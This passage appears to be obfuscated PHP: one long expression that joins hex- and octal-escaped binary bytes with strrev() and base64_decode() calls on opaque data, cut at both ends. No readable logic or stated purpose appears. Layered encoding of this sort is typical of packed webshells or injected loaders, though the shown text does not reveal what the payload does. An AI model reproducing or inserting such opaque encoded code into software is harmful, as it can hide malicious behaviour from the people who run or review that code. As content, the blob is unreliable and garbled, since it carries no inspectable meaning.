\xc9\xa2\x1\xf6\x56\xc9\x49\x56\xd5\xd4\x9c\x1a\x50\x25\x20\x9a".strrev('ªúí‘QÙ\'º·Yc-ÅØsÁÜYœ‡¢ﬂúÄ\'»]∏g6;ê«<2T1ÉÖrﬂ]©L&ÅD±'."\r".'0')."\302\171\221\220\223\204\17\250\31\215\115\41\260\240\263\75\255\135\366\135\77\33\377\36\105\7\62\243\320\145\31\36\107\31\204\72\213\232\72\106\167\352\232\62\106\2\272\105\351\73\241\130\343\12\45\17\0".base64_decode('t8UBcdDNF0gSYjkkpJEv8E2PgnYApBWFOBS7xlkspWhknPYk2GZSLigRoYXxeNTX0ROIUw5DODGN')."\x23\xae\xd8\xc1\xce\xb6\x40\xd3\x38\x47\x65\x3b\x49\x2e\xe\x9b\x63\x39\x9\x31\x3\x49\x31\xc\xdd\x68\x45\xe7\x76\x66\xb1\x0\x65\x31\xb0\xf7\xb1\x40\x7f\x4a\x60\x27\x2c\x2d\x6e\x93\x70\x37\x13\x2e\x11\x17\x3b\xbd\x20\x53\x69".strrev('ùÅVgºv[Çÿ¥ï¨Å3Ò.5"ˇ0Fè¯ﬁ¿Jñ™:oØNÏ≤xjJCä≈â≠‡ÑôQÓ')."\xe8\x6\x5b\x67\x21\x9c\x4b\xad\x96\x6e\xc9\x39\x86\x6\xd3\xa2\x10\x42\xb9\xd\x5d\xab\xc9\x4e\x1b\xf\x60\xf\x67\x42\x70\x75\x16\xe\xdf\x10\x87\xec\x63\x27\x4b\xec\xc0\x40\x38\xf7\x1\x30\x97\x10\xc5\xff\x2e\xae\xa2\x6c\x5a"."\x3\x13\xa1\x93\x2f\x52\x41\xbf\x9b\xc\xa2\x6f\x95\x3b\x48\x4\x78\x16\x50\xa9\xa8\x29\x83\xe9\x6c\x51\xa8\xa9\x17\x8d\xa4\xc2\x70\x6c\x42\x86\x25\x1b\x60\xcd\xe2\x92\x1d\x94\xc1\x84\xd3\x41\x50\x73\x17\x3c\x4d\x70\xc1\x35\xd5".base64_decode('BaQ9FzyucXGJ1cUPAlxM/nQRsdTFSyfBoN+lmn4kHqNyURKts5WF2+qcPOnC9e9RSkrORWvvoo1y')."\321\26\270\320\176\303\117\152\63\0\350\203\324\6\5\1\223\310\272\340\160\300\261\245\245\300\40\355\6\46\124\273\270\300\355\312\30\172\261\320\117\277\44\304\160\145\10\200\327\224\1\302\272\156\271\350\6".strrev('àô àï‰NÚqπ…qq∆ìê¸NÕlW'."\0".'‚KíÔL(`:Œ„ÄöIÚŸÌy¿|ï°·’Çzà')."\xf0\x79\x4b\xce\xd0\x6f\x57\x48\xc5\xe1\xb0\x92\x9c\x4c\xf2\xcd\x8d\x5f\xd8\x2d\xd9\x63\x6c\xe8\x11\x1d\x56\x22\xa6\xca\x43\xcf\x8\x84\xd1\xda\x5e\x7b\xee\x49\x29\x9b\xd3\x11\x21\x1f\x1b\xb1\x4d\x4b\xdd\xbc\x4d\xa1\x2\x5f\x71".base64_decode('IEOIAD4oTHkKCnEOUyQrpGwmqSwzTq8ZFAoT6k9bbysXRvnMpE2UYAEugWfD0XHzIRai5EfV47hf')."\343\171\266\263\140\35\355\140\106\260\337\373\125\155\122\325\304\275\73\207\162\236\307\211\2\222\67\217\341\76\236\56\214\171\13\77\33\160\221\63\3\27\330\67\216\12\134\217\357\161\101\355\141\126\241\356\244"."\44\107\315\351\4\164\333\243\174\76\16\200\155\122\334\101\252\204\110\263\262\301\173\231\316\61\110\330\254\125\46\104\341\121\1\55\55\227\70\273\267\345\21\146\206\151\115\262\143\16\41\150\57\24\107\375\323"."\x45\xba\xd9\xee\xaf\x52\x54\x9c\x74\xaa\xd9\x3\x7a\xb3\x52\x18\xb5\x34\xaa\x57\x8c\x22\xa9\x40\x2\xf2\x0\x3d\x2\xa3\xe2\x7d\xdc\x71\xcc\x0\xa2\xc2\x48\xc5\x6d\x27\x12\xb8\x1a\x3e\xc6\xfa\x80\x60\x93\x3\x23\x60\x78\xe0\x24".strrev('jÆA¯Äy≥òÙk∞)ıBz—dBpàù[)ﬂQ˛Q@v∑\'>ï’„hN'."\n".'êS2'."\n".'Ò'."\n".'∏õ'."\n".'Y').base64_decode('XPXC8san73pz0rSUPOGERzl6xwLbm4RseAxQI15RviQQ4aPIAMNODFx8j05lYUj/gZRqQQjkZjo9')."\xb4\xe2\x88\x2\x9b\x67\x30\xa1\x40\xd4\x25\x9e\xb2\x31\xc8\xa9\xa3\x24\x97\x6b\xb6\xd\xb3\x12\x27\xf7\xd4\x21\x9e\xeb\xe1\x6b\x8f\xb8\x72\x89\x97\x42\x10\x8d\xb7\x1c\x5e\x32\xe1\x90\x70\x9d\x9a\x67\xb7\x4e\x8\xe8\x31\x2d\xbd".base64_decode('wFOEKE4WknihAhbrfFRDsAKkkHzAuxDhkrxIgsbE7ckBDI/IinyGQYkENw+e4ACgCILTNUJPECtx')."\144\134\170\240\304\257\111\161\121\360\303\36\274\100\171\344\124\52\104\217\327\304\160\71\252\170\232\120\271\40\164\163\315\212\22\142\225\321\175\271\34\277\6\163\306\247\315\202\347\252\230\111\204\114\233\255\13"."\11\301\364\376\241\22\214\311\164\135\16\32\342\63\216\137\63\72\105\136\73\363\371\66\161\254\154\6\360\1\255\34\207\374\61\253\152\212\311\126\46\303\254\304\147\276\115\276\261\111\275\166\101\106\224\140\310"."\162\310\233\53\166\53\44\377\351\150\1\246\11\207\112\140\17\5\0\342\72\302\116\116\70\337\21\226\112\264\354\304\55\333\262\37\106\145\10\363\301\66\304\140\376\341\26\165\31\172\76\30\2\363\253\62\321".base64_decode('OfEUenaEmNoE25KJmQCRwFVoujJpMiuKL1lP4J+Lb3rprGPe+NW9dxCqyJvyVIY0rhn/bPgO+Ps+')."\16\163\335\241\23\126\175\255\277\364\320\217\376\130\277\356\347\113\137\234\325\365\367\147\367\232\275\154\343\115\236\316\124\160\313\366\207\67\376\373\301\307\157\231\373\300\131\213\116\71\267\373\360\300\341\356\107"."\376\354\275\167\113\313\227\233\72\377\127\271\247\61\267\355\330\37\154\73\372\332\340\61\77\162\77\227\370\372\261\103\157\377\372\301\63\356\30\377\342\262\147\206\327\35\77\376\217\273\356\134\377\217\217\136\371".strrev('◊˛˝x?)ÏrˇCéâÂﬁ>Ú_ÉûΩyısòõÔáŸE ˙∑3˚O}Øà‰¯>?˘¯é3‰˘∑ﬁí¸')."\x3f\xd\xdf\x72\xda\xc8\xb5\xa9\x75\x5b\x1f\x9d\xfd\x9d\x7f\xd7\xde\xf0\xc8\xa1\x9f\xdf\xf1\x8b\x45\xfa\x7e\xb7\xdd\xf1\xde\xb\xaf\x6d\xfb\xd3\xcd\xe7\xcc\xf8\xea\x6b\x39\x7d\xdf\xf1\x27\x6d\x3c\x31\x37\xb4\xe7\xae\xef\xce\xe9"."\172\153\44\266\145\371\303\315\53\66\54\372\361\157\267\237\73\232\175\246\112\73\347\332\23\175\251\376\206\25\63\67\55\367\335\177\346\376\361\267\316\32\30\274\344\347\315\157\175\266\155\306\201\325\363\156\152"."\330\147\267\115\177\272\355\372\147\76\171\62\274\147\156\371\375\253\217\71\356\313\206\276\171\125\362\145\307\155\117\275\134\237\375\344\27\57\336\177\226\321\374\126\341\336\336\77\77\373\301\145\177\273\360\225\307"."\xde\x7c\xf9\x4d\xd7\x73\xff\x5c\xbc\xff\xd1\xb5\x47\x2d\x5a\x79\xa8\x7f\x6e\x24\xf8\xfe\xd4\x47\x9b\x6e\x5a\xb1\xf4\x90\xdf\x9e\x7e\xfa\xee\xed\x77\x5e\x7d\xc7\xdd\x3f\x5c\x7f\xcf\x1f\xf7\xfa\xe3\x55\x6b\xae\x7e\xee\x9d\xee\xdd"."\176\362\253\375\177\176\365\300\231\332\201\163\212\236\47\157\220\267\376\372\345\237\375\341\301\103\356\377\237\13\266\134\330\322\172\347\256\257\274\362\366\307\133\176\72\74\173\316\237\136\130\71\373\200\153\257\13"."\136\165\342\337\177\344\271\360\305\154\370\274\171\67\377\264\145\131\54\261\356\331\215\327\134\174\115\335\357\352\63\207\173\376\75\262\365\14\145\353\332\335\206\253\333\256\71\357\167\201\135\337\256\377\143\354\321"."\341\253\57\173\107\271\171\257\117\366\374\353\323\253\317\172\354\252\277\365\356\72\153\237\45\47\34\260\367\23\173\77\160\152\341\177\336\274\376\365\317\376\165\305\132\337\255\227\215\154\177\164\303\305\365\213\176"."\330\331\173\377\61\365\133\106\317\251\273\146\331\105\261\147\66\167\173\376\31\172\176\257\267\266\50\325\155\227\172\236\335\32\75\353\172\327\263\276\315\317\155\72\175\343\266\235\375\336\165\217\315\132\177\375\315".strrev('©7ÀquZ/“ÆÉƒómIÃ]≠‚n>è]ˇlª+º˚ùˇûﬂ˘w?Ã∂€O≥~ßÕÒ=låo\'')."\307\350\207\176\266\317\123\77\175\367\265\115\322\5\7\304\217\70\276\245\147\354\372\103\216\15\271\276\177\307\17\57\151\315\354\367\321\137\16\32\17\356\177\165\307\3\175\227\204\137\127\314\256\245\177\56\136"."\174\337\51\167\334\276\374\260\133\17\353\254\157\72\124\117\356\276\372\343\354\333\47\327\74\165\330\237\17\273\160\325\313\332\243\35\17\37\262\137\307\323\173\107\216\170\343\322\352\304\123\235\317\274\174\263\65".base64_decode('/K/hRe2Ju14+covnju9eduLOK+sfi510SOHom69MZ1oeP/nilq6vrvkycu3W094Lrvz885OHdz3g')."\323\133\107\267\76\275\373\306\352\33\317\36\135\225\74\350\301\163\327\274\77\261\307\343\315\375\331\235\137\74\366\322\321\333\137\76\173\311\25\215\163\356\172\372\244\236\33\156\257\63\16\130\235\323\136\71\355".base64_decode('yVcefWvJtr/ufvDzv//4jd3G3SPpAy4965i7zz7aKl7z2MgDm4L+E1e/F9rT/5NTkl5z90ufbWr4').base64_decode('6c5Hlh+5Od965m2HnuXa8tP7+yILcqeVNu9YdPwuf7vxgHd3f/fcLeu/e/Xeu01s/v26weUdJx32').base64_decode('WLoYO+7NjVfsl33zzdtr6l/dzy8dv8uS6667/vePv3z+Qf7Ubjf85eMdNx058Gx4a/SAGzZVH3Ri')."\xfe\xbc\xdc\x59\xa7\x5b\xa9\xed\xd9\xd4\x82\xf9\xd5\xfd\x35\xe7\xd4\x1c\xd8\x7c\xcb\xb1\x35\x97\x2c\x79\xfb\xb9\x9f\xed\x5c\xa2\x5a\xb7\xdf\x79\xfb\xb2\xdf\xfe\x51\x19\x7f\x69\xe8\x4f\xbf\x7e\xfe\x90\x6b\x77\xac\x38\x64\x4f\x65"."\346\352\347\15\327\266\343\373\316\364\54\335\172\123\364\352\53\17\330\246\154\332\347\373\257\206\117\170\343\263\367\217\234\161\330\221\146\325\300\322\252\123\252\14\337\71\57\235\64\147\247\166\377\316\175\77\15"."\314\170\171\140\164\315\331\247\234\275\351\344\327\133\366\334\166\343\357\347\35\334\37\275\161\277\65\13\176\70\266\367\117\77\330\170\332\320\5\67\355\167\236\65\357\236\263\376\360\364\357\137\254\175\156\377\71"."\117\57\377\361\337\37\171\167\336\211\253\256\212\134\61\274\345\57\247\356\361\314\163\37\236\275\342\234\371\363\227\335\172\376\76\13\57\270\154\341\304\301\233\26\374\337\31\265\352\127\33\222\333\276\174\177\323".base64_decode('c9ufP+WLh878pXvTyxMv1P97LNEY3/eviWtX1s2+RDpAPvLCOWf99qlj5mz75OSvf5w7Yk1VcGLt')."\324\41\317\275\375\141\323\167\146\77\330\121\173\360\202\35\147\276\366\345\302\73\67\32\57\37\276\317\1\267\275\236\334\365\363\357\116\334\176\371\223\233\32\263\372\55\273\277\367\235\354\272\252\347\177\264\333"."\126\263\376\320\33\346\257\270\350\366\323\217\73\256\364\223\173\316\367\337\335\173\120\376\257\113\237\76\60\256\317\170\343\343\201\255\127\274\60\353\173\67\77\177\304\360\335\227\137\276\261\255\341\267\37\254\333"."\232\333\365\352\271\73\357\135\65\160\345\232\303\222\177\71\354\321\207\127\277\266\306\172\334\275\266\371\366\47\175\243\367\376\353\307\277\272\345\67\63\117\321\24\153\376\254\252\241\167\32\27\166\173\16\171\376".strrev('OwÛ¿Ú<g˚Éˇ;ù{#€r]e§z2ﬁÈò¯ﬁn5NZökï«^Ê˘◊s¸Ûæåáy”ˇŒywÔzæè∫')."\x7d\xf6\xd9\x2f\xda\xef\x9e\xf8\xf4\xf9\x53\x7\x43\x8f\x7f\xfd\xc5\x9b\x17\x67\x9e\xf0\xae\xbd\x73\xea\x93\xd7\x9f\x3d\x3f\xe3\xfd\x6a\xec\xe3\x7b\x3f\x7a\xfe\x57\x5f\x6d\xff\xe2\xc1\x3f\x7f\xf4\xea\xd7\x9\xe5\xf0\xf9\x9f\xcc"."\150\377\344\313\43\176\367\325\143\277\272\347\271\371\217\17\137\375\222\331\362\332\145\357\337\333\367\303\13\317\254\332\313\363\33\327\341\277\171\157\217\266\137\157\151\231\73\373\346\360\223\226\153\347\323\47\377"."\170\154\366\5\157\76\165\100\152\357\265\147\25\226\314\372\323\252\267\356\227\346\136\170\360\331\257\234\334\372\344\262\251\203\377\34\270\371\147\127\177\36\75\104\175\272\346\47\327\75\270\373\226\360\335\327\276"."\xf5\xf8\xb6\x93\x83\x1b\xde\x39\x70\xe7\x49\x35\xa7\xfd\xe6\x91\x3\xbf\x37\xf9\xee\xfd\xe7\xbd\xfb\xfb\x33\x5f\xfa\xe0\xad\xee\xe8\x43\xb3\x4e\xff\xcd\xbb\x27\x2c\xf6\xd6\x9f\x7b\xd7\x4b\xb7\x35\xac\xbf\xf5\x83\xc7\x5f\xfc\xec"."\362\177\277\63\357\334\333\36\270\362\304\230\147\361\232\241\273\307\62\372\372\155\327\34\362\331\233\263\356\36\374\333\367\116\71\71\274\366\251\373\266\35\320\360\343\115\133\256\137\363\317\123\347\154\75\327\334"."\x73\xd9\xb9\xb5\x6b\x1b\x7f\x72\x7c\xd5\xef\xb7\xbd\x78\xe0\xa9\xea\xa5\x97\x1d\xbf\xcd\xd7\xb4\xe5\x90\x89\x87\x92\xdd\x7\xee\xf1\xec\x9\xc3\x91\x91\x99\x57\x3e\xdb\xf1\x4c\xf8\xa1\xa6\xbd\x1b\x6e\x77\x5d\x7f\xdb\x67\xef\xd5"."\x54\x59\x7\x4d\x1d\xfe\x81\xfa\xd5\x96\xf9\x27\xfc\xe8\xd5\x87\xee\x3d\xe3\x4f\x46\xfc\xc6\xd0\x25\x7b\xbe\xb6\x63\xf5\x75\xa3\x5b\x5f\xd8\x76\xc3\xb1\x67\x9c\xa3\xad\x3d\x77\xdb\xdd\x5f\x5f\xfe\x90\xef\xa0\x5f\x6e\x5e\x73\x81"."\x79\x45\xff\x31\xef\xfd\xe9\xdd\xc7\x6e\xcc\x2d\xd8\xfc\xc6\xc9\x77\xd7\x2c\xbb\x5f\xbb\xea\xf1\xb9\x5f\xaf\xbd\xfc\xcb\x75\x43\x7f\xfd\x9d\xfe\xb7\x7\xdf\xfe\xab\xbc\x4d\xff\xf8\x27\x1f\xae\xd4\xff\x71\xd3\x9a\xd2\x33\xab\xf3"."\xcf\xbc\x37\xf7\xf3\x97\xce\xbe\x3b\x7f\x44\xf0\x5f\xef\xdf\xf9\xfa\x89\x4d\x17\x7b\xd3\xc7\xfd\xf2\xe3\xee\xf\x5e\x7c\xc9\x7d\x88\xfe\x68\xcb\xec\x71\xfd\x96\x1b\x9b\xea\xdf\xfa\xf5\x13\x4f\xac\x3e\xe8\xfd\xab\x63\xb5\x4b\xfd"."\xbb\xdd\x11\xbd\xfd\xb6\x9f\x25\xaf\x7d\xe5\xc5\xbe\xeb\x4f\x38\xeb\x72\xff\xbf\xf7\xf5\x5e\x75\xd9\xd\x97\xfe\xf3\x9c\x60\xed\xd1\xc7\x3f\x5b\x1d\xa9\x5f\x52\x8a\xfd\x7d\xce\xc7\x1b\xbe\xbf\xcb\x9a\x96\x33\xb6\xcd\x7e\xf5\xe1"."\x2b\x5f\xff\xc1\x9\x2b\xee\xfb\xf0\xe2\xd\xa9\x99\x97\xa5\xda\x6f\xbb\xef\xec\xf6\x53\xbf\x7b\xe0\xea\x1d\x3b\xbe\xf7\xcb\x5f\x2f\xf9\xc8\x1d\xca\xfd\xf8\xb6\x86\xdf\xdd\xf1\xc1\xe3\x4f\xdc\xba\x4b\xdf\x69\xaf\xec\xf6\xe4\xef"."\x76\x5c\xb0\x7a\xe0\xdd\xd6\x1f\xd6\x7c\x78\xf1\xe9\x2b\xaf\x79\xe8\xe1\xd4\xda\xbf\xd\xbf\xfe\xe2\xf2\xc4\x41\x7b\x7e\x74\xc1\xe6\xdb\x3f\xfd\xfc\xe1\xff\xb5\x12\xef\x3c\x3c\x9a\x4a\x4c\x9c\x71\xed\x9\xdb\x5b\x3a\xce\xea\xb3"."\272\276\176\352\225\333\327\135\177\301\257\264\33\122\377\63\265\372\264\253\157\270\342\314\335\376\275\127\337\145\325\57\77\174\131\151\143\162\337\227\26\257\70\364\240\336\167\47\76\270\377\372\246\322\71\347\377"."\363\342\175\173\357\330\357\201\37\56\155\77\364\323\143\315\237\134\266\350\341\303\257\272\140\107\307\36\133\37\136\373\375\225\375\353\316\50\155\376\277\137\334\160\365\354\7\132\322\371\73\56\74\352\311\337\246".base64_decode('bj55VeJ7l596U//+M2bsP+JZvbfnusFnly1/ybra815xxyfjVzzddm37Hvd3GhvumHuXd/JHs4ae')."\175\343\316\73\37\172\355\321\113\237\77\371\251\367\363\117\54\172\60\366\323\323\146\74\372\331\300\227\227\336\236\164\365\175\347\206\206\15\333\77\174\377\227\317\225\356\54\45\277\174\162\346\125\67\325\146\177"."\64\367\246\334\360\205\47\154\213\137\167\164\313\36\376\336\173\356\122\134\77\332\67\363\341\315\373\245\116\322\73\277\327\376\365\261\233\123\157\35\376\141\150\267\333\366\63\2\117\36\161\222\374\326\276\146\366"."\xfd\x53\x7\xce\x1c\xfd\x7c\x89\xfb\x33\xe3\xec\xc2\x92\x5d\xda\x8f\xf9\xd7\x31\x67\x9f\x77\xf6\x47\x7f\x9b\x77\xda\xcf\xe6\xae\x9e\xf1\xf1\x35\xb3\xaf\x39\x69\xeb\xbf\x1f\x48\x86\xdb\x86\x1e\x8a\xb6\x7\x4f\x3f\xf1\x84\xf7\xf6"."\x59\xe6\x5f\x71\xe3\xd3\x3b\xfd\xf7\x48\x47\x5e\xf0\xe1\xa7\x9b\xef\xbe\xfb\x67\x9f\x6d\x7f\xe7\xd5\x9f\x95\x3e\x78\xd0\xfb\x44\xdb\x17\x7f\x7f\xb7\xfd\xee\x5\x9f\xbf\xf5\xc6\x47\xbf\xb8\xf4\xae\xaf\xee\x6f\xbf\x7b\xf2\xab\x47".base64_decode('XnjaW3Xs2AdvvvDp3Xed8dVdXz396Z9/svNXGwofv/PqL4/64rVPB39++/998fTXX33e1LfgaHV+')."\364\344\265\361\73\76\72\174\346\310\256\33\73\67\356\266\102\275\356\345\333\76\154\231\270\350\316\7\214\137\234\170\313\253\7\114\275\24\234\34\315\315\35\172\357\275\137\376\365\361\127\176\371\376\127\276\177"."\x5c\xdf\x7e\xd0\x19\x67\x9c\xf1\x8f\x57\x6e\xff\x7a\x97\xab\x4f\x1b\x39\x28\xf9\xf4\x45\x3d\xf9\x3f\xce\x7e\xe5\xd1\x7d\xb3\x13\x8d\x71\x57\xe8\xca\x44\xd0\x33\xd8\xf2\xbb\x9b\x3f\x7b\xe8\xda\x23\x8e\x7d\xf6\x9e\x7f\x9c\x79\xfb"."\x26\xeb\xc8\x91\x1b\x67\x5d\xf4\xc5\x17\xe7\x2f\x5a\x73\xf0\xae\x8f\xdc\x25\x25\x8b\x9b\xfd\x3f\x38\xfc\x86\xd5\x67\x35\xac\xdd\xa6\x5c\xfe\x9b\x83\xaf\xfc\xe9\x25\xf3\x95\x79\xc7\x5c\x75\xe0\x11\x17\x9f\x59\xbb\xfe\xd9\xcd\xbb"."\x5f\x73\x4e\x6a\xcf\x5b\x17\xac\xff\xed\xd1\x1d\x4d\x2b\xb6\x44\x97\xd7\x6c\xfd\xc3\xa7\xcb\xcf\x92\x37\xa7\xdf\xd8\xeb\x8b\x7d\x7f\xda\x77\xd1\xc5\x27\xfc\x98\x2a\x36\x37\xce\x25\x3a\x0\xe3\x4a\x46\x2b\xe4\x47\x70\x84\x28\x6b"."\x8e\x14\xa6\xc6\xc6\x53\x44\x84\x24\x78\xf3\x9a\x17\x10\x91\xb2\x99\x9c\x23\x34\xd7\x13\xe9\xb2\x38\x95\xca\xab\x6\xb9\x8a\x4a\x27\xf2\x39\x9d\x1e\x6d\x35\x37\xce\x23\x81\x16\x92\xa9\x98\x36\x52\xf9\x49\x72\x8e\xd8\x32\x9f\x94"."\60\157\36\325\64\35\63\362\311\14\331\234\21\315\15\271\120\324\363\111\162\253\324\70\217\124\3\252\52\24\250\136\216\154\225\162\306\310\24\255\275\65\245\351\44\105\117\345\65\323\40\21\242\176\141\345\144".base64_decode('rZAhdWhoaCFlmKnsOD3Rmk++0tJAW02/29JEOmTBXJJxfMzUFJWeVCWN0VyWnLA1NJMvahMlK5kh')."\73\13\260\101\120\47\113\344\363\132\336\234\52\146\310\36\245\224\325\306\46\47\310\175\216\221\35\237\222\165\162\245\64\131\322\22\126\236\354\0\32\346\322\236\261\122\206\72\106\232\135\54\231\351\111\213\124"."\xa3\x61\x1\xe9\xef\x94\x95\x9e\x1c\x49\x92\x4b\xc0\x26\x5a\xe5\xe6\xf9\x24\xb0\xa0\x91\xe0\xe5\x8b\x25\x5d\x1e\x23\xf5\x50\x8c\xd1\x6c\x92\xea\xdf\x36\x2e\x20\xb8\xf3\xea\xc9\x20\x35\x35\x92\xbe\xc8\x9a\x8a\x5a\x98\x22\x1a\x55"."\x4d\x64\x2c\xe7\x36\x36\xd0\xbe\x23\xd5\x2c\x8e\x98\xd6\x44\x96\xf4\x6c\x69\x24\x67\x8c\x65\xa9\xa6\x7b\xde\x54\xc7\xc6\x49\x1\xf2\xe4\xd4\xc8\xc4\x98\x4a\x9\xa6\x89\x7e\x95\xf4\x61\xa9\xa8\xe4\xb2\x1a\x19\xc9\xe6\x26\x52\x76".base64_decode('aXQkk6Iac/NbyK3keGY0ZSbJrnfuXNLGTDKfG5skX2ueS0gzW9C1YoKU0NBCGptKyuOjKqnm3GaC').base64_decode('O54oavkCIc+mBlLFybFsWqP65IY2Ukgr9BDRTBpWkXyxkVRubFwZzRTIWM5vIEUDoh2ZzJKi51Mi')."\x6b\xa4\x3\xa5\x4f\xe4\x8a\xe9\x94\x46\xa7\x15\x69\x7d\x53\x13\x1d\x9\x2b\x39\x2e\xe7\xa8\x96\x9a\x39\x9e\x2f\x8d\x90\xaf\x16\x92\xe3\x25\x3d\x43\xba\x62\x1\x6d\xc8\x3c\x9a\x71\x4c\xd6\x12\x85\x71\x95\x92\x74\x3\x1d\x4b\x92"."\74\267\205\4\112\251\274\74\62\116\210\326\112\344\322\123\223\143\264\5\244\212\112\72\133\52\114\345\51\224\164\372\30\310\225\60\351\155\263\62\76\146\25\111\137\217\344\106\325\244\105\112\121\107\113\23\114".strrev('‹Ó©&'."\n".'“ô50] /6Å,“ëz®Ø#≥`lh≥U$©≈#–ó¢hk∆=,…'."\n".'÷ô;‰åbíi;["sõ')."\6\102\275\343\331\211\261\124\232\364\307\210\222\310\225\14\172\203\256\116\244\162\64\62\227\176\104\323\63\226\231\44\123\120\315\217\47\62\62\71\172\150\254\47\75\60\62\65\256\310\364\44\173\64\123\34\233".base64_decode('1EkPTCbGR+QcoZVEDiBO0LmQMApT41RDRE5NJMcI92ipJ1/OTGlg/lNzhnxG1S3CxQuTiSklTRjm')."\x2\x3a\x2f\x1b\xe8\xac\x9d\xb7\x80\x4\x46\xc6\xf2\x69\x35\x49\x68\x7c\x3c\x95\x19\x99\xc8\x13\xfa\x2b\x8c\x15\x93\x19\x8b\xb4\x4a\x37\x8b\x99\x34\x65\xd9\xab\x29\x13\xea\x90\x93\xa3\xf4\xb8\xdb\xb4\x64\xab\x68\x3a\x10\xa8\x2a"."\177\122\324\3\35\125\24\252\360\110\211\225\137\131\233\105\244\206\114\323\371\101\7\74\41\22\256\266\141\64\42\342\46\65\113\110\6\61\133\52\124\101\204\347\61\74\106\57\16\42\226\156\260\313\176\254\223"."\343\201\65\364\330\33\124\337\140\303\110\45\154\351\14\112\117\161\234\51\151\47\74\201\272\56\56\106\74\264\73\22\102\267\342\203\172\113\66\107\75\42\330\55\246\252\32\50\71\227\363\330\155\200\342\350\77"."\322\133\330\302\304\124\306\212\12\233\141\320\142\204\16\123\234\153\262\362\26\362\233\126\1\306\373\130\350\12\373\240\11\32\155\5\52\101\0\150\212\162\0\134\33\302\70\363\223\60\52\204\35\135\342\341\65"."\253\201\301\332\112\75\56\324\212\164\206\27\166\206\27\25\310\333\351\30\46\261\326\31\166\270\315\117\132\111\35\170\5\310\105\106\131\137\241\321\265\23\240\155\334\355\244\113\216\74\221\5\217\113\302\37\164"."\111\350\152\121\262\133\227\4\375\22\273\203\25\107\137\254\244\241\24\162\162\222\125\260\60\51\245\145\220\65\325\52\245\1\275\113\124\71\132\262\164\32\26\253\46\336\161\72\32\143\233\77\316\346\330\22\101"."\207\27\231\341\6\273\140\21\317\142\321\125\57\257\63\216\262\13\234\10\50\211\135\121\33\112\212\56\271\171\45\217\60\251\66\54\272\240\141\52\201\311\234\42\33\266\313\241\105\355\205\154\1\232\350\131\13"."\333\211\301\20\271\365\212\13\337\45\141\256\166\55\102\163\316\13\47\72\247\74\376\16\301\226\16\242\11\71\260\246\321\102\310\126\26\163\50\16\25\65\30\16\27\65\230\112\364\333\275\102\176\17\107\35\47"."\x3a\x7f\x69\x52\xb1\x5e\x7b\xfb\x41\x85\xdd\xac\x4b\x40\x33\x1\x47\x4d\x99\x48\xbb\x89\xd0\xfc\xc\x32\x1c\x82\x7d\x50\x98\xf7\x26\xcc\x8e\x3a\xf7\x1b\xb2\x5a\x62\xd3\xb\x80\x6b\x6b\x4c\x59\xc9\xcc\xc9\xf4\x2\xcb\x4\xac\x5c".base64_decode('1RQ2DkWTHcP3BDvi/iAxO4N6b1B9mHc1pB9O4nE5TSwmgmTwodZgPJnTTWESxDOKFScLCGlKhy8S')."\354\214\367\373\250\52\260\134\50\170\313\77\6\272\11\364\262\234\320\15\113\40\241\170\112\25\56\134\342\205\242\263\160\321\254\323\327\37\214\107\42\41\341\123\255\2\217\202\172\376\374\312\25\306\270\276\77"."\xbc\x74\x10\xaf\x63\x4d\x73\x5c\x37\x48\x2d\xa0\xd9\x1d\x54\xdd\x8c\x48\xc4\xfa\x7\xd0\x56\x67\xb7\x2f\xcc\xd4\x33\xe7\x7a\xea\x3d\xd\x1c\x17\x7c\x30\xe\xb5\x54\x17\x53\x6b\xa1\x48\xd4\x17\xae\x60\x82\x89\x4d\x33\xc9\xc0\x13"."\163\114\222\241\73\64\50\165\206\172\6\172\373\42\330\346\20\303\373\102\102\72\122\302\263\45\213\140\122\154\240\277\307\327\31\220\202\175\321\20\325\256\145\112\306\110\257\72\302\342\264\351\206\251\60\223\113"."\x92\x1f\x47\x44\xdd\x6f\xb1\x44\x56\x12\x99\x2d\x43\xae\xea\x58\x55\xac\x2e\x56\x13\xab\x5d\xe7\x89\x99\xc3\x64\x52\xaf\x13\x47\x84\xac\x20\xfd\x7e\xd2\xa2\x56\x16\x62\xcb\x4e\x6f\x24\xb2\x82\x58\x16\x84\xc2\xbe\xce\x1e\x5a\xb"."\x40\x4d\x24\x18\xea\xc\xe2\xc0\xce\x73\x6f\x78\xf3\xb6\x33\x76\x5e\x7c\xdd\xf6\x93\x4f\x7\x5\xed\xb8\xe8\xd8\x1d\xe7\x6f\x79\xf3\xd6\xd3\xdf\x3a\xee\xce\xed\xd7\x9d\xb6\xf3\xae\x33\x76\x9c\xfb\x87\x1d\xa7\x1d\x43\xaa\xfe\xd6"."\x1f\x6e\x79\xf3\xce\xbb\x77\x9e\x7b\xd5\xf6\xeb\x2e\xd8\xb1\x71\xeb\xce\x8b\x8e\xc7\x9\x6f\x5f\x7d\xc3\xf6\x53\xae\x62\x15\x93\xde\x3e\xe7\xae\x1d\x67\x5c\xb9\xe3\xbc\xeb\x77\x9c\x7e\xdd\xf6\xdb\xce\xd9\x7e\xc7\xb1\xdb\x6f\xbd"."\325\5\162\277\175\302\351\73\357\274\156\307\111\33\167\134\176\364\216\233\117\335\161\311\351\333\117\331\264\375\302\253\166\236\361\207\355\227\35\267\375\304\323\337\372\303\171\63\234\264\203\343\103\164\24\310\235"."\xba\x77\x6d\xcc\xac\xab\xc1\x3d\x1b\x33\xe7\xc0\x5e\xad\x5\xbf\x35\x50\x4f\x17\xfc\x52\xf5\x44\x40\x71\x11\x68\x64\xd3\xd7\x19\x70\xea\xbd\x8b\x51\x62\xaa\x5a\x87\x89\x2\xd2\x34\x93\x21\x4c\x62\xea\x4a\xe3\x71\x64\xa\x51\x3d"."\x6d\x2d\x36\x90\xa1\x17\x2a\x25\x54\xc6\x1f\x88\x74\x86\x83\x1d\x1\xa2\x9\xca\x6\x6a\x36\xd2\x48\x24\x57\xf5\x0\x1a\x9\xaf\x64\x61\x66\x1c\x52\x66\x60\x2c\xd5\x50\x3\xe3\x5a\xc9\xd6\x10\xd9\x3\xb6\x8\xc5\xbc\x86\x2a\x2b"."\125\101\325\227\52\27\144\361\110\144\221\252\340\22\5\0\112\22\314\266\32\150\247\210\224\354\252\127\127\273\352\135\15\265\22\261\76\306\71\210\265\261\124\105\54\215\131\76\333\107\134\11\133\254\301\125\137"."\53\125\25\106\253\110\275\170\277\202\332\307\61\246\51\311\256\32\122\141\261\272\34\27\260\50\323\62\144\25\360\54\51\351\142\40\226\37\374\332\54\210\223\36\236\3\217\23\300\160\302\44\137\237\337\216\211".base64_decode('DY/7qyVZS4EU3L/iMFfXSgmia1shEWWzdcZiW2fUzCEson8pG2+sH